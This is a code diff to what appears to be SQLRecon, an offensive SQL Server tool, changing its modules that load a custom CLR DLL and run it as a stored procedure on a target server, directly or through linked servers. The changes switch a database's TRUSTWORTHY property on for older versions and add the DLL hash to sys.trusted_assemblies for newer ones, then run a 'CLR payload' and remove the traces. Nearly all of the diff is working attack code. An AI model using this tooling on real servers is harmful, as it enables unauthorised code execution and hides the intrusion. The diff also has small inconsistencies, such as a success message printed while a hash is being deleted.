@@ -33,6 +33,9 @@ namespace SQLRecon.Modules
             // The queries dictionary contains all queries used by this module
             Dictionary<string, string> queries = new Dictionary<string, string>
             {
+                { "sql_version", Query.GetSqlVersionNumber },
+                { "database_trust_on", string.Format(Query.AlterDatabaseTrustOn, Var.Database) },
+                { "database_trust_off", string.Format(Query.AlterDatabaseTrustOff, Var.Database) },
                 { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
                 { "drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
                 { "add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
@@ -83,53 +86,76 @@ namespace SQLRecon.Modules
                 return;
             }
             
-            // Check to see if the hash already exists.
-            string sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
+            /*
+             * First identify the version of SQL server.
+             *
+             * SQL server versions 2016 and below require altering the database
+             * to "SET TRUSTWORTHY ON". 
+             * 
+             * SQL server versions 2016 and below (< 13.0.X) do not require
+             * adding the SHA-512 hash of a CLR assembly into sys.trusted_assemblies.
+             *
+             */
             
-            if (sqlOutput.ToLower().Contains("permission was denied"))
-            {
-                Print.Error($"You do not have the correct privileges to perform this action.", true);
-                // Go no further.
-                return;
-            }
-            
-            if (sqlOutput.Contains("System.Byte[]"))
-            {
-                Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                sqlOutput = Sql.Query(con, queries["drop_clr_hash"]);
-            }
-            
-            if (sqlOutput.ToLower().Contains("permission was denied"))
-            {
-                Print.Error($"You do not have the correct privileges to perform this action.", true);
-                // Go no further.
-                return;
-            }
+            List<string> sqlVersion = Print.ExtractColumnValues(Sql.CustomQuery(con, queries["sql_version"]), "column0");
+            int version = Int32.Parse(sqlVersion[0].Split('.')[0]);
+            string sqlOutput;
 
-            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            Sql.Query(con, queries["add_clr_hash"]);
-           
-            // Verify that the SHA-512 hash has been added.
-            sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
-
-            if (sqlOutput.Contains(dllPath))
+            if (version <= 13)
             {
-                Print.Success($"Added SHA-512 hash for '{dll}' to sys.trusted_assemblies with a random name of '{dllPath}'.", true);
+                Print.Status($"Legacy version of SQL Server detected: {sqlVersion[0]}", true);
+                Print.Status($"Turning on the trustworthy property on '{Var.Database}'.", true);
+                Sql.Query(con, queries["database_trust_on"]);
             }
             else
             {
-                Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
-                // Go no further.
-                return;
-            }
+                // Check if the hash already exists.
+                sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
+            
+                if (sqlOutput.ToLower().Contains("permission was denied"))
+                {
+                    Print.Error($"You do not have the correct privileges to perform this action.", true);
+                    // Go no further.
+                    return;
+                }
+            
+                if (sqlOutput.Contains("System.Byte[]"))
+                {
+                    Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
+                    sqlOutput = Sql.Query(con, queries["drop_clr_hash"]);
+                }
+            
+                if (sqlOutput.ToLower().Contains("permission was denied"))
+                {
+                    Print.Error($"You do not have the correct privileges to perform this action.", true);
+                    // Go no further.
+                    return;
+                }
 
+                // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
+                Sql.Query(con, queries["add_clr_hash"]);
+           
+                // Verify that the SHA-512 hash has been added.
+                sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
+
+                if (sqlOutput.Contains(dllPath))
+                {
+                    Print.Success($"Added SHA-512 hash for '{dll}' as a trusted assembly with a random name of '{dllPath}'.", true);
+                }
+                else
+                {
+                    Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
+                    // Go no further.
+                    return;
+                }
+            }
+            
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
             Sql.Query(con, queries["drop_procedure"]);
             Sql.Query(con, queries["drop_assembly"]);
 
             // Create a new custom assembly with the randomly generated name.
-            Print.Status($"Creating a new custom assembly with the name '{assem}'.", true);
             Sql.Query(con, queries["create_assembly"]);
 
             // Check to see if the custom assembly has been created
@@ -137,7 +163,7 @@ namespace SQLRecon.Modules
 
             if (sqlOutput.Contains(assem))
             {
-                Print.Success($"Created a new custom assembly with the name '{assem}' and loaded the DLL into it.", true);
+                Print.Success($"Loaded DLL into a new custom assembly called '{assem}'.", true);
             }
             else
             {
@@ -147,8 +173,6 @@ namespace SQLRecon.Modules
                 // Go no further.
                 return;
             }
-            
-            Print.Status($"Loading DLL into stored procedure '{function}'.", true);
             
             /*
              * Create a stored procedure based on the function name in the DLL.
@@ -192,11 +216,11 @@ namespace SQLRecon.Modules
 
             if (sqlOutput.Contains(function))
             {
-                Print.Success($"Created '[{assem}].[StoredProcedures].[{function}]'.", true);
+                Print.Success($"Added the '{assem}' assembly into a new stored procedure called '{function}'.", true);
             }
             else
             {
-                Print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
+                Print.Error("Unable to load the DLL into a new stored procedure. Cleaning up.", true);
                 Sql.Query(con, queries["drop_procedure"]);
                 Sql.Query(con, queries["drop_assembly"]);
                 Sql.Query(con, queries["drop_clr_hash"]);
@@ -209,10 +233,17 @@ namespace SQLRecon.Modules
             Sql.Query(con, queries["execute_clr_payload"]);
 
             // Cleaning up.
-            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and hash from sys.trusted_assembly.", true);
+            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and trusted assembly hash '{dllPath}'.", true);
             Sql.Query(con, queries["drop_procedure"]);
             Sql.Query(con, queries["drop_assembly"]);
             Sql.Query(con, queries["drop_clr_hash"]);
+            
+            // Ensure that the database trustworthy property is reverted.
+            if (version <= 13)
+            {
+                Print.Status($"Turning off the trustworthy property on '{Var.Database}'.", true);
+                Sql.Query(con, queries["database_trust_off"]);
+            }
         }
         
         /// <summary>
@@ -238,8 +269,10 @@ namespace SQLRecon.Modules
             
             // The queries dictionary contains all queries used by this module
             Dictionary<string, string> queries = new Dictionary<string, string>
-            
             {
+                { "sql_version", Query.GetSqlVersionNumber },
+                { "rpc_database_trust_on", string.Format(Query.AlterDatabaseTrustOn, Var.Database) },
+                { "rpc_database_trust_off", string.Format(Query.AlterDatabaseTrustOff, Var.Database) },
                 { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
                 { "rpc_drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
                 { "rpc_add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
@@ -290,55 +323,77 @@ namespace SQLRecon.Modules
                 return;
             }
             
-            // Check to see if the hash already exists.
-            string sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
+            /*
+             * First identify the version of SQL server.
+             *
+             * SQL server versions 2016 and below require altering the database
+             * to "SET TRUSTWORTHY ON".
+             *
+             * SQL server versions 2016 and below (< 13.0.X) do not require
+             * adding the SHA-512 hash of a CLR assembly into sys.trusted_assemblies.
+             *
+             */
+            
+            List<string> sqlVersion = Print.ExtractColumnValues(Sql.CustomQuery(con, queries["sql_version"]), "column0");
+            int version = Int32.Parse(sqlVersion[0].Split('.')[0]);
+            string sqlOutput;
 
-            if (sqlOutput.ToLower().Contains("permission was denied"))
+            if (version <= 13)
             {
-                Print.Error($"You do not have the correct privileges to perform this action.", true);
-                // Go no further.
-                return;
-            }
-            
-            if (sqlOutput.Contains("System.Byte[]"))
-            {
-                Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                sqlOutput = Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
-            }
-            
-            if (sqlOutput.ToLower().Contains("permission was denied"))
-            {
-                Print.Error($"You do not have the correct privileges to perform this action.", true);
-                // Go no further.
-                return;
-            }
-
-            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            Sql.CustomQuery(con, queries["rpc_add_clr_hash"]);
-            
-            // Verify that the SHA-512 hash has been added.
-            sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
-            
-            if (sqlOutput.Contains(dllPath))
-            {
-                Print.Success(
-                    $"Added SHA-512 hash for '{dll}' to sys.trusted_assemblies with a random name of '{dllPath}'.", true);
+                Print.Status($"Legacy version of SQL Server detected: {sqlVersion[0]}", true);
+                Print.Status($"Turning on the trustworthy property on '{Var.Database}'.", true);
+                Sql.Query(con, queries["rpc_database_trust_on"]);
             }
             else
             {
-                Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
-                // Go no further.
-                return;
-            }
+                // Check to see if the hash already exists.
+                sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
 
+                if (sqlOutput.ToLower().Contains("permission was denied"))
+                {
+                    Print.Error($"You do not have the correct privileges to perform this action.", true);
+                    // Go no further.
+                    return;
+                }
+            
+                if (sqlOutput.Contains("System.Byte[]"))
+                {
+                    Print.Success($"Added SHA-512 hash for '{dll}' as a trusted assembly with a random name of '{dllPath}'.", true);
+                    sqlOutput = Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
+                }
+            
+                if (sqlOutput.ToLower().Contains("permission was denied"))
+                {
+                    Print.Error($"You do not have the correct privileges to perform this action.", true);
+                    // Go no further.
+                    return;
+                }
+
+                // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
+                Sql.CustomQuery(con, queries["rpc_add_clr_hash"]);
+            
+                // Verify that the SHA-512 hash has been added.
+                sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
+            
+                if (sqlOutput.Contains(dllPath))
+                {
+                    Print.Success(
+                        $"Added SHA-512 hash for '{dll}' to sys.trusted_assemblies with a random name of '{dllPath}'.", true);
+                }
+                else
+                {
+                    Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
+                    // Go no further.
+                    return;
+                }
+            }
+            
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
             Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
             Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
 
             // Create a new custom assembly with the randomly generated name.
-            Print.Status($"Creating a new custom assembly with the name '{assem}'.", true);
-            
             Sql.CustomQuery(con, queries["rpc_create_assembly"]);
             
             // Check to see if the custom assembly has been created
@@ -346,7 +401,7 @@ namespace SQLRecon.Modules
             
             if (sqlOutput.Contains(assem))
             {
-                Print.Success($"Created a new custom assembly with the name '{assem}' and loaded the DLL into it.", true);
+                Print.Success($"Loaded DLL into a new custom assembly called '{assem}'.", true);
             }
             else
             {
@@ -364,8 +419,7 @@ namespace SQLRecon.Modules
              * will need to be executed with a GO before it, and a GO after it a
              * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
              */
-
-            Print.Status($"Loading DLL into stored procedure '{function}'.", true);
+            
             try
             {
                 SqlCommand query = new(queries["rpc_load_dll_into_stored_procedure"], con);
@@ -381,11 +435,11 @@ namespace SQLRecon.Modules
             
             if (sqlOutput.Contains(function))
             {
-                Print.Success($"Created '[{assem}].[StoredProcedures].[{function}]'.", true);
+                Print.Success($"Added the '{assem}' assembly into a new stored procedure called '{function}'.", true);
             }
             else
             {
-                Print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
+                Print.Error("Unable to load the DLL into a new stored procedure. Cleaning up.", true);
                 Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
                 Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
                 Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
@@ -399,10 +453,17 @@ namespace SQLRecon.Modules
             Sql.CustomQuery(con, queries["rpc_execute_clr_payload"]);
 
             // Cleaning up.
-            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and hash from sys.trusted_assembly.", true);
+            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and trusted assembly hash '{dllPath}'.", true);
             Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
             Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
             Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
+            
+            // Ensure that the database trustworthy property is reverted.
+            if (version <= 13)
+            {
+                Print.Status($"Turning off the trustworthy property on '{Var.Database}'.", true);
+                Sql.Query(con, queries["rpc_database_trust_off"]);
+            }
         }
         
         /// <summary>
